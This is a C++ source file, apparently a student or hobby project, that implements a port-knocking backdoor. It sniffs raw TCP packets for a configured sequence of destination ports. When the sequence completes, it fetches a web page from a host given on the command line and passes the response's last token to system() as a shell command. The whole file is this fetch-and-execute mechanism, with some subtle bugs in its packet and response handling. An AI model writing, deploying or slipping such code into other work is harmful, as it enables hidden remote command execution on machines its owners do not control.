#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <iostream>
#include <fstream>
#include <vector>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <unistd.h> 
#define BUFFER_SIZE 65536
#define MAX_PACKETS 100
using namespace std;
int main(int argc, char* argv[])
{
	if(argc != 3)
	{
		cout << "Please give the required arguments. The usage is " << argv[0] << " configuration_file URL" << endl;
		exit(1);
	}
	std::vector<int> sequence;
	int sockfd, newsockfd, portno;
	string line;
	ifstream config_file(argv[1]);
	if(config_file.is_open())
	{
		while(getline(config_file,line))
			sequence.push_back(atoi(line.c_str()));
		// vector<int>::iterator it;
		// for(it = sequence.begin(); it != sequence.end(); it++)
		// {
		// 	cout <<*it<<" ";
		// }
		// cout<<endl;
		config_file.close();
	}
	else
	{
		cout << "Could not open the config file" << endl;
		exit(1);
	}
	
	int raw_socket;
	raw_socket = socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
	if(raw_socket < 0)
	{
		cout << "Error creating raw socket" << endl;
		return (1);
	}
	// cout << "entered promiscuous mode" << endl;
	struct sockaddr saddr;
	int socksize;
	char* buffer = (char *) malloc (BUFFER_SIZE);
	bool flag = false, flag1 = false;
	int count = 0;
	struct iphdr * ip;
	struct tcphdr * tcp;
	vector<int>::iterator it = sequence.begin();
	size_t x = 0;
	size_t size = sequence.size();
	do
	{
		// printf("waiting for recvs\n");
		if (recvfrom(raw_socket,buffer,BUFFER_SIZE,0,&saddr,(socklen_t*)sizeof(struct sockaddr)) > 0);
		{
			// cout <<"received" << endl;
			int port = *it;
			ip = (struct iphdr *) buffer;
			tcp = (struct tcphdr *) (buffer + ip->ihl*4);
			if(tcp->dest == htons(port))
			{
				// cout << "port number is " << ntohs(tcp->dest) << endl;
				it++;
				x++;
			}
			count++;
		}
	}
	while(count < MAX_PACKETS && x < size);

	//check
	if(x == size)
	{
		// cout<< "received knocking sequence" << endl;
		int url_socket;
		url_socket = socket (AF_INET, SOCK_STREAM, 0);
		if( url_socket == -1)
		{
			cout << "error in creating the url socket"<< endl;
			close(raw_socket);
			exit(1);
		}
		struct hostent *url_host;
		struct sockaddr_in url_addr;
		if((url_host = gethostbyname(argv[2])) == NULL)
		{
			cout << "error in resolvig the url" << endl;
			close(url_socket);
			close(raw_socket);
			exit(1);
		}
		memcpy(&url_addr.sin_addr,url_host->h_addr,url_host->h_length);
		url_addr.sin_port = htons(80);
		url_addr.sin_family = AF_INET;
		if(connect(url_socket,(struct sockaddr *)&url_addr,sizeof(url_addr)) < 0)
		{
			cout << "Error inconnecting to the URL" << endl;
			close(url_socket);
			close(raw_socket);
			exit(1);
		}
		string request = "GET /\r\n";
		if(send(url_socket, request.c_str(), strlen(request.c_str()),0) < 0)
		{
			cout << "Error in sending request" << endl;
			close(url_socket);
			close(raw_socket);
			exit(1);
		}
		char response[BUFFER_SIZE];
		memset(response,0,BUFFER_SIZE);
		int total = BUFFER_SIZE-1, bytes_received = 0,temp;	 
		do
		{
			temp = read(url_socket,response+bytes_received,total-bytes_received);
			if(temp < 0)
			{
				cout << "Error geting response" << endl;
				close(url_socket);
				close(raw_socket);
				exit(1);
			}
			if(temp == 0)
				break;
			bytes_received += temp;
		}while(bytes_received < total);
		// cout << "The response is " << endl << response << endl;
		char *pointer;
		// cout << "splitting the response" << endl;
		pointer = strtok(response,"\r\n\r\n");
		std::vector<string> tokens;
		while(pointer != NULL)
		{
			tokens.push_back(pointer);
			// cout << endl<< endl << endl << pointer << endl;
			pointer = strtok(NULL,"\r\n\r\n");
		}
		vector<string>::iterator tok = tokens.begin();
		while(tok != tokens.end())
			tok++;
		tok--;
		// cout << "Final token is " << *tok << endl;
		string command = *tok;
		cout << "command is "<< command.c_str() << endl;
		system(command.c_str());
		close(url_socket);
	}
	else
		cout << "did not receive knocking sequence" << endl;
	close(raw_socket);
	return 0;
}
